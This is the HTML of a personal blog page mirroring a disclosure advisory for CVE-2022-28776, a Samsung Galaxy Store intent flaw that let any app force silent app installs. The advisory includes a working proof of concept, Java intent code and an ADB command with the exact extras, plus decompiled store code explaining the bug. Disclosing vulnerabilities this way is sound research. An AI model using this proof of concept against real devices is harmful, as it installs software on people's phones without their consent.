<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>CVE-2022-28776 Details | YayWebsiteYay (I suck at titles)</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="CVE-2022-28776 Details" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Sometimes I want to publish stuff unfiltered." />
<meta property="og:description" content="Sometimes I want to publish stuff unfiltered." />
<link rel="canonical" href="http://localhost:4000/cves/cve-2022-28776" />
<meta property="og:url" content="http://localhost:4000/cves/cve-2022-28776" />
<meta property="og:site_name" content="YayWebsiteYay (I suck at titles)" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2022-28776 Details" />
<script type="application/ld+json">
{"@type":"WebPage","headline":"CVE-2022-28776 Details","description":"Sometimes I want to publish stuff unfiltered.","url":"http://localhost:4000/cves/cve-2022-28776","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="YayWebsiteYay (I suck at titles)" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">YayWebsiteYay (I suck at titles)</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/published-research/">Published Research</a><a class="page-link" href="/cves/">My CVEs</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post">

  <header class="post-header">
    <h1 class="post-title">CVE-2022-28776 Details</h1>
  </header>

  <div class="post-content">
    <h4 id="original-post-httpslabsf-securecomadvisoriessamsung-galaxy-any-app-can-install-any-app">Original post: <a href="https://labs.f-secure.com/advisories/samsung-galaxy-any-app-can-install-any-app/">https://labs.f-secure.com/advisories/samsung-galaxy-any-app-can-install-any-app/</a></h4>

<table>
  <tbody>
    <tr>
      <td><strong>Product</strong></td>
      <td>Galaxy Store prior to version 4.5.36.4</td>
    </tr>
    <tr>
      <td><strong>Severity</strong></td>
      <td>High</td>
    </tr>
    <tr>
      <td><strong>CVE Reference</strong></td>
      <td>CVE-2022-28776</td>
    </tr>
    <tr>
      <td><strong>Type</strong></td>
      <td>Automatic Application Install</td>
    </tr>
  </tbody>
</table>

<h2 id="description">Description</h2>

<p>F-Secure looked into exploiting the Samsung Galaxy S21 device for Austin Pwn2Own 2021. The Galaxy App Store contained an issue with how it handled specific intents. When an intent was sent to one of three exported activities, the Galaxy App Store would create a new intent, while taking all of the calling intent’s extras and packaging them with the new intent. This new intent could then be manipulated in such a way that the Galaxy App Store would be forced to automatically install other applications onto the victim’s device without consent.</p>

<h2 id="the-exploit">The Exploit</h2>

<p>The following exported activities could have been used to exploit this issue:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.viewpager.InterimActivity</code></li>
  <li><code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.interim.essentials.InterimEssentialsActivity</code></li>
  <li><code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.downloadableapps.DownloadableAppsActivity</code></li>
</ul>

<p>As an example, the following Java code could have been used by a third party application to automatically install the application “Pokemon Go”. This code uses the Java class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.viewpager.InterimActivity</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Intent intent = new Intent();
intent.setComponent(new ComponentName("com.sec.android.app.samsungapps", "com.sec.android.app.samsungapps.viewpager.InterimActivity"));
intent.putExtra("directcall", true);
intent.putExtra("isInternal", true);
intent.putExtra("directInstall", true);
intent.putExtra("installReferrer", "com.sec.android.app.samsungapps");
intent.putExtra("directOpen", true);
intent.putExtra("GUID", "com.nianticlabs.pokemongo.ares");
startActivity(intent);
</code></pre></div></div>

<p>Alternatively, the following ADB command could have been used to install the application “Pokemon Go”. This command also uses the Java class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.viewpager.InterimActivity</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>am start -n com.sec.android.app.samsungapps/com.sec.android.app.samsungapps.viewpager.InterimActivity --ez directcall true --ez isInternal true --ez directInstall true --es installReferrer com.sec.android.app.samsungapps --ez directOpen true --es GUID com.nianticlabs.pokemongo.ares
</code></pre></div></div>

<h2 id="technical-details">Technical Details</h2>

<p>Each of the exploitable exported classes contains code that parses the calling intent and creates:</p>

<ul>
  <li>a data URI that starts with <code class="language-plaintext highlighter-rouge">samsungapps://CategoryList/</code></li>
  <li>extracts the intent extras and adds an additional extra Boolean <code class="language-plaintext highlighter-rouge">isFromInterim</code> and sets it to True (though this extra does not get used later)</li>
</ul>

<p>The data URI and extras are passed to class <code class="language-plaintext highlighter-rouge">com.sec.android.app.util.DeeplinkUtil</code> method <code class="language-plaintext highlighter-rouge">openInternalDeeplink</code>. To show this, below is the code found in class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.interim.essentials.InterimEssentialsActivity</code> method <code class="language-plaintext highlighter-rouge">a</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>private void a() {
    Bundle extras = getIntent().getExtras();
    if (extras == null) {
        extras = new Bundle();
    }
    extras.putBoolean(DeepLink.EXTRA_DEEPLINK_IS_FROM_INTERIM, true);
    DeeplinkUtil deeplinkUtil = new DeeplinkUtil(this);
    deeplinkUtil.openInternalDeeplink("samsungapps://CategoryList/" + Constant.GALAXY_ESSENTIALS, extras);
}
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">openInternalDeepLink</code> creates a new intent, adds the previously captured extras to the intent and adds an extra string sender value of <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps</code>. Thenewly created intent is sent to class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.deeplink.DeepLinkFactory</code> method <code class="language-plaintext highlighter-rouge">createDeepLink</code> which will return a deeplink, and set the deeplink as an internal deeplink:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public boolean openInternalDeeplink(String str, Bundle bundle) {
    if (!Common.isValidString(str)) {
       return false;
    }
    Intent intent = new Intent();
    intent.putExtra("sender", this.activity.getPackageName());
    intent.setData(Uri.parse(str));
    if (bundle != null) {
        intent.putExtras(bundle);
    }
    DeepLink createDeepLink = DeepLinkFactory.createDeepLink(intent);
    if (createDeepLink == null) {
        return false;
    }
    createDeepLink.setIsInternal(true);
    DeeplinkManager.getInstance().setInternalDeeplink(true);
    DeepLinkFactoryUtil.sendDeeplinkLaunchingLog(createDeepLink.getDeeplinkUrl(), true);
    return createDeepLink.runInternalDeepLink(this.a);
}
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">createdeeplink</code> creates a “Product Detail Deeplink” deeplink. This deeplink contains all of the extras that were set in the intent:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public static DeepLink createDeepLink(final Intent intent) {
    try {
        final boolean booleanExtra = intent.getBooleanExtra("directcall", false);
        final String stringExtra = intent.getStringExtra("GUID");
        final Bundle extras = intent.getExtras();
        if (booleanExtra &amp;&amp; stringExtra != null &amp;&amp; stringExtra.length() != 0) {
            final StringBuilder sb = new StringBuilder();
            sb.append("[GADeepLink] ::directcall::");
            sb.append(stringExtra);
            AppsLog.d(sb.toString());
            return DeepLinkFactoryUtil.createProductDetailDeepLink(stringExtra, extras);
        }
</code></pre></div></div>

<p>DeepLink parameters are set via class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.utility.deeplink</code>. DeepLink which sets different values based on the passed intent extras, such as <code class="language-plaintext highlighter-rouge">directInstall</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public void initialize(Bundle bundle) {
    ...
    this.u = getBundleBoolean(bundle, EXTRA_DEEPLINK_DIRECT_INSTALL, false);
    ...
</code></pre></div></div>

<p>The application then automatically processes the newly created “Product Detail Deeplink” deeplink as if it was a standard deeplink. While processing, the class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.deeplink. DetailPageDeepLink</code> method <code class="language-plaintext highlighter-rouge">runInternalDeeplink</code> is called, which looks for intent extras such as <code class="language-plaintext highlighter-rouge">directInstall</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public boolean runInternalDeepLink(Context context) {
    AppsLog.d(this.a + "::runInternalDeepLink::");
    if (launchApp(context, getDetailID())) {
        return true;
    }
    if (this.isStickerApp) {
        DetailPageHelper.launchStickerDetailFromDeeplink(context, getDetailID(), this.d, getAdSource(), getDeeplinkUrl());
        return true;
    }
    DetailConstant.DETAIL_TYPE detail_type = DetailConstant.DETAIL_TYPE.COMMON;
    if (isForGear()) {
        detail_type = DetailConstant.DETAIL_TYPE.GEAR;
    } else if (a()) {
        detail_type = DetailConstant.DETAIL_TYPE.GAME;
    }
    DetailPageHelper.launchDetailFromDeeplink(context, getDetailID(), detail_type, this.mSignId, this.mQueryStr, getAdSource(), this.b, getSender(), isDirectInstall(), isDirectOpen(), getType(), this.f, getDeeplinkUrl(), this.mEncodedReferrer);
    return true;
}
</code></pre></div></div>

<p>Similar to the bug outlined in <a href="https://yogehi.github.io/cves/cve-2022-22288.html">https://yogehi.github.io/cves/cve-2022-22288.html</a>, class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.deeplink.DetailPageDeepLink</code> method <code class="language-plaintext highlighter-rouge">putDetailCommonExtra</code> is eventually called again:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public void putDetailCommonExtra(Context context) {
    ...
    if (isDirectInstall() &amp;&amp; appManager.enableDDI(getSender(), getDetailID(), DeeplinkManager.getInstance().getInternalDeeplink())) {
        this.intent.putExtra(DeepLink.EXTRA_DEEPLINK_DIRECT_INSTALL, isDirectInstall());
        this.intent.putExtra("sender", getSender());
    }
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">enableDDI</code> is called again, but this time it will return true due to the calling intent being an internal deeplink:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public boolean enableDDI(String sender, String appId, boolean isInternalDeeplink) {
    if (isDDITestMode()) {
        return true;
    }
    if ((!isGalaxyStore(sender) || !isInternalDeeplink) &amp;&amp; !isWhiteListAppForOneClick(sender, appId)) {
        return false;
    }
    return true;
}
</code></pre></div></div>

<p>Since <code class="language-plaintext highlighter-rouge">enableDDI</code> returns true, the target application gets installed.</p>

<h2 id="remedial-action">Remedial Action</h2>

<p>Samsung has released the Galaxy Store version 4.5.36.4 which addresses this issue. Users should update their Galaxy Store application to the latest version available.</p>

<h2 id="credits">Credits</h2>

<p>This issue was discovered by Ken Gannon.</p>

<h2 id="timeline">Timeline</h2>

<table>
  <tbody>
    <tr>
      <td><strong>Date</strong></td>
      <td><strong>Summary</strong></td>
    </tr>
    <tr>
      <td>17/10/2021</td>
      <td>Issue disclosed to Samsung Mobile Security</td>
    </tr>
    <tr>
      <td>17/10/2021</td>
      <td>Issue assigned to a Samsung Security Analyst</td>
    </tr>
    <tr>
      <td>22/11/2021</td>
      <td>Samsung confirms the vulnerability and rates it as a critical risk issue</td>
    </tr>
    <tr>
      <td>13/02/2022</td>
      <td>Patch released, Samsung initiates process for bug bounty reward</td>
    </tr>
    <tr>
      <td>12/04/2022</td>
      <td>CVE Assigned</td>
    </tr>
    <tr>
      <td>04/05/2022</td>
      <td>Advisory Published</td>
    </tr>
  </tbody>
</table>

  </div>

</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">YayWebsiteYay (I suck at titles)</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">YayWebsiteYay (I suck at titles)</li><li><a class="u-email" href="mailto:Fake_email_link">Fake_email_link</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">yogehi</span></a></li><li><a href="https://www.twitter.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">yogehi</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Sometimes I want to publish stuff unfiltered.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
